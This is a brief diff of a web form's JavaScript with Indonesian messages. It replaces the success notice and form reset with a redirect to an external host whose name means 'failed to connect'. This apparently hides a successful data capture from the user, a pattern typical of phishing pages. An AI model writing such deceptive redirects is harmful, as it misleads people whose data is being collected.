@@ -190,9 +190,7 @@
         });
 
         if (!result.ok) throw new Error("send-failed");
-        notice.style.color = "#198b45";
-        notice.textContent = "Data berhasil dikirim.";
-        form.reset();
+        window.location.assign("https://gagal-terhubung.linkyhost.com");
       } catch (_) {
         notice.style.color = "#b42318";
         notice.textContent = "Data belum terkirim. Silakan coba lagi.";
